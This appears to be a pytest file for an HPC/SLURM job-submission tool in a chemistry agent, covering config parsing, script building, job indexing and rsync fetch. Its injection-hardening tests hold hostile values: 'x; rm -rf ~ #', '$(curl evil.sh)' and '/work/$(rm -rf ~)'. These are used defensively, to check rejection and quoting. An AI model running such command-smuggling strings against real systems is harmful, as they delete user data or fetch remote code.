"""hpc_slurm MCP tests — config loading, script generation, missing-config path.

A real SLURM cluster isn't available in CI; tests exercise the config
parsing, the SLURM-script builder, and the polite NO_HPC_CONFIG cold
path.
"""

from __future__ import annotations

from pathlib import Path


def test_no_hpc_config_when_yaml_missing(monkeypatch, tmp_path: Path):
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    from chemaster.mcp.hpc_slurm.server import submit
    r = submit(command="echo hi", jobname="t1")
    assert not r["ok"]
    assert r["error_code"] == "NO_HPC_CONFIG"
    assert "hpc.yaml" in r["suggestion"]


def test_load_config_reads_yaml(monkeypatch, tmp_path: Path):
    cfg_dir = tmp_path / "ch"
    cfg_dir.mkdir()
    monkeypatch.setenv("CHEMASTER_HOME", str(cfg_dir))
    (cfg_dir / "hpc.yaml").write_text(
        "host: hpc.example.edu\n"
        "user: alice\n"
        "ssh_key: ~/.ssh/id_ed25519\n"
        "remote_workdir: /work/alice/runs\n"
        "partition: cpu\n"
        "time_limit: '12:00:00'\n"
        "modules:\n"
        "  - psi4/1.9\n"
    )
    from chemaster.mcp.hpc_slurm.server import _load_config
    cfg = _load_config()
    assert cfg["host"] == "hpc.example.edu"
    assert cfg["partition"] == "cpu"
    assert "psi4/1.9" in cfg["modules"]


def test_build_slurm_script_includes_essentials():
    from chemaster.mcp.hpc_slurm.server import _build_slurm_script
    s = _build_slurm_script(
        jobname="benzene-tddft", command="orca calc.inp",
        partition="gpu", time_limit="04:00:00",
        modules=["openmpi/4.1", "orca/5.0"],
    )
    assert "#!/bin/bash" in s
    assert "#SBATCH --job-name=benzene-tddft" in s
    assert "#SBATCH --partition=gpu" in s
    assert "#SBATCH --time=04:00:00" in s
    assert "module load openmpi/4.1" in s
    assert "module load orca/5.0" in s
    # PITFALLS §4.3: must cd into submit dir
    assert 'cd "$SLURM_SUBMIT_DIR"' in s
    assert "orca calc.inp" in s


def test_status_no_config(monkeypatch, tmp_path: Path):
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    from chemaster.mcp.hpc_slurm.server import status
    r = status("12345")
    assert not r["ok"]
    assert r["error_code"] == "NO_HPC_CONFIG"


def test_fetch_no_rsync(monkeypatch, tmp_path: Path):
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    import shutil as _shutil
    monkeypatch.setattr(_shutil, "which",
                        lambda x: None if x == "rsync" else "/bin/" + x)
    from chemaster.mcp.hpc_slurm.server import fetch
    r = fetch("12345", str(tmp_path / "out"))
    assert not r["ok"]
    assert r["error_code"] == "ENGINE_NOT_FOUND"


# ── submit → jobs index → fetch 链路（此前 fetch 功能性坏死的回归） ──────────


def _write_cfg(home: Path) -> None:
    (home / "hpc.yaml").write_text(
        "host: hpc.example.edu\n"
        "user: alice\n"
        "remote_workdir: /work/alice/runs\n"
    )


def test_submit_records_job_index(monkeypatch, tmp_path: Path):
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    _write_cfg(tmp_path)
    from chemaster.mcp.hpc_slurm import server as srv

    monkeypatch.setattr(
        srv, "_ssh_run",
        lambda **kw: (0, "Submitted batch job 98765\n", ""),
    )
    r = srv.submit(command="echo hi", jobname="benzene")
    assert r["ok"] and r["result"]["job_id"] == "98765"

    entry = srv._lookup_job("98765")
    assert entry is not None
    assert entry["remote_workdir"].startswith("/work/alice/runs/benzene-")
    assert entry["host"] == "hpc.example.edu"
    assert entry["user"] == "alice"


def test_fetch_uses_recorded_remote_dir(monkeypatch, tmp_path: Path):
    """fetch 必须 rsync submit 登记的那个目录（而不是按 job_id 猜文件名）。"""
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    _write_cfg(tmp_path)
    from chemaster.mcp.hpc_slurm import server as srv

    srv._record_job("777", {"remote_workdir": "/work/alice/runs/x-123",
                            "host": "hpc.example.edu", "user": "alice"})

    captured: dict = {}

    def fake_run(cmd, **kw):
        captured["cmd"] = cmd

        class P:
            returncode = 0
            stdout = "ok"
            stderr = ""
        return P()

    monkeypatch.setattr(srv.subprocess, "run", fake_run)
    r = srv.fetch("777", str(tmp_path / "out"))
    assert r["ok"]
    assert r["result"]["remote_dir"] == "/work/alice/runs/x-123"
    assert "alice@hpc.example.edu:/work/alice/runs/x-123/" in captured["cmd"]
    # 老实现的 --include *job_id* 猜测法必须消失
    assert "--include" not in captured["cmd"]


def test_fetch_unknown_job_errors_with_escape_hatch(monkeypatch, tmp_path: Path):
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    _write_cfg(tmp_path)
    from chemaster.mcp.hpc_slurm import server as srv
    r = srv.fetch("nope", str(tmp_path / "out"))
    assert not r["ok"] and r["error_code"] == "UNKNOWN_JOB"
    assert "remote_dir" in r["suggestion"]


def test_fetch_explicit_remote_dir_override(monkeypatch, tmp_path: Path):
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    _write_cfg(tmp_path)
    from chemaster.mcp.hpc_slurm import server as srv

    captured: dict = {}

    def fake_run(cmd, **kw):
        captured["cmd"] = cmd

        class P:
            returncode = 0
            stdout = ""
            stderr = ""
        return P()

    monkeypatch.setattr(srv.subprocess, "run", fake_run)
    r = srv.fetch("777", str(tmp_path / "out"),
                  remote_dir="/scratch/custom")
    assert r["ok"]
    assert "alice@hpc.example.edu:/scratch/custom/" in " ".join(captured["cmd"])


# ── 远端 shell 注入加固（推翻"无任意 shell 执行"承诺的安全洞） ──────────────


def test_submit_rejects_injection_jobname(monkeypatch, tmp_path: Path):
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    _write_cfg(tmp_path)
    from chemaster.mcp.hpc_slurm import server as srv
    r = srv.submit(command="echo hi", jobname="x; rm -rf ~ #")
    assert not r["ok"] and r["error_code"] == "INVALID_JOBNAME"


def test_status_rejects_injection_job_id(monkeypatch, tmp_path: Path):
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    _write_cfg(tmp_path)
    from chemaster.mcp.hpc_slurm import server as srv
    r = srv.status("$(curl evil.sh)")
    assert not r["ok"] and r["error_code"] == "INVALID_JOB_ID"


def test_fetch_quotes_remote_dir(monkeypatch, tmp_path: Path):
    """remote_dir 里的 shell 元字符必须被 quote，不能拼裸命令。"""
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    _write_cfg(tmp_path)
    from chemaster.mcp.hpc_slurm import server as srv

    captured: dict = {}

    def fake_run(cmd, **kw):
        captured["cmd"] = cmd

        class P:
            returncode = 0
            stdout = ""
            stderr = ""
        return P()

    monkeypatch.setattr(srv.subprocess, "run", fake_run)
    srv.fetch("777", str(tmp_path / "out"), remote_dir="/work/$(rm -rf ~)")
    joined = " ".join(captured["cmd"])
    # $(...) 必须被 quote 包住，不能作为裸命令替换出现
    assert "'/work/$(rm -rf ~)/'" in joined


def test_record_job_atomic_write_survives_concurrent(monkeypatch, tmp_path: Path):
    """原子写：并发登记后索引不丢、不截断。"""
    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
    from chemaster.mcp.hpc_slurm import server as srv
    for i in range(20):
        srv._record_job(str(i), {"remote_workdir": f"/w/{i}",
                                 "host": "h", "user": "u"})
    idx = srv._load_jobs_index()
    assert len(idx) == 20 and idx["19"]["remote_workdir"] == "/w/19"


def test_hpc_tools_registered():
    from chemaster.agent.tool_loader import build_default_registry
    reg = build_default_registry()
    for name in ("hpc_submit", "hpc_status", "hpc_fetch"):
        assert reg.has(name), f"{name} not registered"
    # submit + fetch are destructive (cluster side-effect); status is read-only
    assert reg.get("hpc_submit").is_destructive
    assert reg.get("hpc_status").is_read_only
    assert reg.get("hpc_fetch").is_destructive
